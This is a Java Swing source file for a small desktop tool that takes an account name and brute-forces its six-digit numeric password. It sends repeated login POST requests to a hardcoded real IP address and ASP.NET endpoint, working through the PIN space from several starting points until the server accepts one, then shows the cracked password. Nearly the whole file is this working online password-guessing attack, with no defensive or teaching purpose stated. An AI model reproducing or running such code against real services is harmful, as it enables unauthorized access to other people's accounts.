import javax.swing.JOptionPane;

/*
 * _Password.java
 *
 * Created on __DATE__, __TIME__
 */

/**
 * 
 * @author __USER__
 */
public class _Password extends javax.swing.JFrame {
	_POST post;

	/** Creates new form _Password */
	public _Password() {
		initComponents();
	}

	/**
	 * This method is called from within the constructor to initialize the form.
	 * WARNING: Do NOT modify this code. The content of this method is always
	 * regenerated by the Form Editor.
	 */
	// GEN-BEGIN:initComponents
	// <editor-fold defaultstate="collapsed" desc="Generated Code">
	private void initComponents() {

		jTextField1 = new javax.swing.JTextField();
		jButton1 = new javax.swing.JButton();
		jLabel1 = new javax.swing.JLabel();

		setDefaultCloseOperation(javax.swing.WindowConstants.EXIT_ON_CLOSE);

		jTextField1.setText("jTextField1");

		jButton1.setText("jButton1");
		jButton1.addActionListener(new java.awt.event.ActionListener() {
			public void actionPerformed(java.awt.event.ActionEvent evt) {
				jButton1ActionPerformed(evt);
			}
		});

		jLabel1.setText("jLabel1");

		javax.swing.GroupLayout layout = new javax.swing.GroupLayout(
				getContentPane());
		getContentPane().setLayout(layout);
		layout.setHorizontalGroup(layout
				.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
				.addGroup(
						layout.createSequentialGroup()
								.addGap(24, 24, 24)
								.addGroup(
										layout.createParallelGroup(
												javax.swing.GroupLayout.Alignment.LEADING)
												.addComponent(jLabel1)
												.addGroup(
														layout.createSequentialGroup()
																.addComponent(
																		jTextField1,
																		javax.swing.GroupLayout.PREFERRED_SIZE,
																		javax.swing.GroupLayout.DEFAULT_SIZE,
																		javax.swing.GroupLayout.PREFERRED_SIZE)
																.addGap(108,
																		108,
																		108)
																.addComponent(
																		jButton1)))
								.addContainerGap(120, Short.MAX_VALUE)));
		layout.setVerticalGroup(layout
				.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
				.addGroup(
						layout.createSequentialGroup()
								.addGap(26, 26, 26)
								.addGroup(
										layout.createParallelGroup(
												javax.swing.GroupLayout.Alignment.BASELINE)
												.addComponent(
														jTextField1,
														javax.swing.GroupLayout.PREFERRED_SIZE,
														javax.swing.GroupLayout.DEFAULT_SIZE,
														javax.swing.GroupLayout.PREFERRED_SIZE)
												.addComponent(jButton1))
								.addGap(33, 33, 33).addComponent(jLabel1)
								.addContainerGap(199, Short.MAX_VALUE)));

		pack();
	}// </editor-fold>
		// GEN-END:initComponents

	private void jButton1ActionPerformed(java.awt.event.ActionEvent evt) {
		// TODO add your handling code here:
		String str;
		for (int i = 0; i < 100000; i++) {
			post = new _POST("http://111.204.39.58:8080/DfssAjax.aspx",
					"AjaxMethod=LOGIN&Account=" + jTextField1.getText()
							+ "&Pwd=" + String.format("%06d", i), "", 1);
			post.run2();
			System.out.println(String.format("%06d", i));
			if (post._GetStatus().compareTo("true") == 0) {
				jLabel1.setText(String.valueOf(i));
				return;
			}
			post = new _POST("http://111.204.39.58:8080/DfssAjax.aspx",
					"AjaxMethod=LOGIN&Account=" + jTextField1.getText()
							+ "&Pwd=" + String.format("%06d", 999999 - i), "",
					1);
			post.run2();
			if (post._GetStatus().compareTo("true") == 0) {
				jLabel1.setText(String.valueOf(i));
				return;
			}

			post = new _POST("http://111.204.39.58:8080/DfssAjax.aspx",
					"AjaxMethod=LOGIN&Account=" + jTextField1.getText()
							+ "&Pwd=" + String.format("%06d", 800000 - i), "",
					1);
			post.run2();
			if (post._GetStatus().compareTo("true") == 0) {
				jLabel1.setText(String.valueOf(i));
				return;
			}

			post = new _POST("http://111.204.39.58:8080/DfssAjax.aspx",
					"AjaxMethod=LOGIN&Account=" + jTextField1.getText()
							+ "&Pwd=" + String.format("%06d", 800000 + i), "",
					1);
			post.run2();
			if (post._GetStatus().compareTo("true") == 0) {
				jLabel1.setText(String.valueOf(i));
				return;
			}

			post = new _POST("http://111.204.39.58:8080/DfssAjax.aspx",
					"AjaxMethod=LOGIN&Account=" + jTextField1.getText()
							+ "&Pwd=" + String.format("%06d", 700000 - i), "",
					1);
			post.run2();
			if (post._GetStatus().compareTo("true") == 0) {
				jLabel1.setText(String.valueOf(i));
				return;
			}

			post = new _POST("http://111.204.39.58:8080/DfssAjax.aspx",
					"AjaxMethod=LOGIN&Account=" + jTextField1.getText()
							+ "&Pwd=" + String.format("%06d", 700000 + i), "",
					1);
			post.run2();
			if (post._GetStatus().compareTo("true") == 0) {
				jLabel1.setText(String.valueOf(i));
				return;
			}
			
			post = new _POST("http://111.204.39.58:8080/DfssAjax.aspx",
					"AjaxMethod=LOGIN&Account=" + jTextField1.getText()
							+ "&Pwd=" + String.format("%06d", 600000 - i), "",
					1);
			post.run2();
			if (post._GetStatus().compareTo("true") == 0) {
				jLabel1.setText(String.valueOf(i));
				return;
			}

			post = new _POST("http://111.204.39.58:8080/DfssAjax.aspx",
					"AjaxMethod=LOGIN&Account=" + jTextField1.getText()
							+ "&Pwd=" + String.format("%06d", 600000 + i), "",
					1);
			post.run2();
			if (post._GetStatus().compareTo("true") == 0) {
				jLabel1.setText(String.valueOf(i));
				return;
			}
			
			post = new _POST("http://111.204.39.58:8080/DfssAjax.aspx",
					"AjaxMethod=LOGIN&Account=" + jTextField1.getText()
							+ "&Pwd=" + String.format("%06d", 500000 - i), "",
					1);
			post.run2();
			if (post._GetStatus().compareTo("true") == 0) {
				jLabel1.setText(String.valueOf(i));
				return;
			}

			post = new _POST("http://111.204.39.58:8080/DfssAjax.aspx",
					"AjaxMethod=LOGIN&Account=" + jTextField1.getText()
							+ "&Pwd=" + String.format("%06d", 500000 + i), "",
					1);
			post.run2();
			if (post._GetStatus().compareTo("true") == 0) {
				jLabel1.setText(String.valueOf(i));
				return;
			}
			
			post = new _POST("http://111.204.39.58:8080/DfssAjax.aspx",
					"AjaxMethod=LOGIN&Account=" + jTextField1.getText()
							+ "&Pwd=" + String.format("%06d", 400000 - i), "",
					1);
			post.run2();
			if (post._GetStatus().compareTo("true") == 0) {
				jLabel1.setText(String.valueOf(i));
				return;
			}

			post = new _POST("http://111.204.39.58:8080/DfssAjax.aspx",
					"AjaxMethod=LOGIN&Account=" + jTextField1.getText()
							+ "&Pwd=" + String.format("%06d", 400000 + i), "",
					1);
			post.run2();
			if (post._GetStatus().compareTo("true") == 0) {
				jLabel1.setText(String.valueOf(i));
				return;
			}
			
			post = new _POST("http://111.204.39.58:8080/DfssAjax.aspx",
					"AjaxMethod=LOGIN&Account=" + jTextField1.getText()
							+ "&Pwd=" + String.format("%06d", 300000 - i), "",
					1);
			post.run2();
			if (post._GetStatus().compareTo("true") == 0) {
				jLabel1.setText(String.valueOf(i));
				return;
			}

			post = new _POST("http://111.204.39.58:8080/DfssAjax.aspx",
					"AjaxMethod=LOGIN&Account=" + jTextField1.getText()
							+ "&Pwd=" + String.format("%06d", 300000 + i), "",
					1);
			post.run2();
			if (post._GetStatus().compareTo("true") == 0) {
				jLabel1.setText(String.valueOf(i));
				return;
			}
			
			post = new _POST("http://111.204.39.58:8080/DfssAjax.aspx",
					"AjaxMethod=LOGIN&Account=" + jTextField1.getText()
							+ "&Pwd=" + String.format("%06d", 200000 - i), "",
					1);
			post.run2();
			if (post._GetStatus().compareTo("true") == 0) {
				jLabel1.setText(String.valueOf(i));
				return;
			}

			post = new _POST("http://111.204.39.58:8080/DfssAjax.aspx",
					"AjaxMethod=LOGIN&Account=" + jTextField1.getText()
							+ "&Pwd=" + String.format("%06d", 200000 + i), "",
					1);
			post.run2();
			if (post._GetStatus().compareTo("true") == 0) {
				jLabel1.setText(String.valueOf(i));
				return;
			}
			
			post = new _POST("http://111.204.39.58:8080/DfssAjax.aspx",
					"AjaxMethod=LOGIN&Account=" + jTextField1.getText()
							+ "&Pwd=" + String.format("%06d", 100000 - i), "",
					1);
			post.run2();
			if (post._GetStatus().compareTo("true") == 0) {
				jLabel1.setText(String.valueOf(i));
				return;
			}

			post = new _POST("http://111.204.39.58:8080/DfssAjax.aspx",
					"AjaxMethod=LOGIN&Account=" + jTextField1.getText()
							+ "&Pwd=" + String.format("%06d", 100000 + i), "",
					1);
			post.run2();
			if (post._GetStatus().compareTo("true") == 0) {
				jLabel1.setText(String.valueOf(i));
				return;
			}
		}
	}

	/**
	 * @param args
	 *            the command line arguments
	 */
	public static void main(String args[]) {
		java.awt.EventQueue.invokeLater(new Runnable() {
			public void run() {
				new _Password().setVisible(true);
			}
		});
	}

	// GEN-BEGIN:variables
	// Variables declaration - do not modify
	private javax.swing.JButton jButton1;
	private javax.swing.JLabel jLabel1;
	private javax.swing.JTextField jTextField1;
	// End of variables declaration//GEN-END:variables

}